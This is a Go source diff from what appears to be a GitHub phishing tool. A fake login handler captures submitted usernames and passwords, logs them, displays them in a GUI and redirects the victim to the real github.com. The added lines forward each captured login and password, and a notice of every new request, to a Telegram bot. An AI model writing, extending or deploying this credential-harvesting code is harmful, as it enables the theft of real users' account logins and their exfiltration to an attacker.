@@ -22,13 +22,20 @@ func serveGithubLogin(win fyne.Window, textGrid *widget.TextGrid, textStream *st
 
 			if login != "" || pass != "" {
 				log.Printf("Login = %s  Passw = %s", login, pass)
+
 				*textStream += "\nlogin = " + login + "\nPass = " + pass + "\n"
+				if useTelegramBot {
+					tg.send("Login = " + login + "\nPass = " + pass)
+				}
 				textGrid.SetText(*textStream)
 				notiApp.SendNotification(fyne.NewNotification("New Form", login+" : "+pass))
 				http.Redirect(response, req, "https://github.com", 301)
 				return
 			}
 			*textStream += "New Requests\n"
+			if useTelegramBot {
+				tg.send("New Request on GitHub")
+			}
 			textGrid.SetText(*textStream)
 		} else {
 			log.Println("Error to req.ParseFrom")
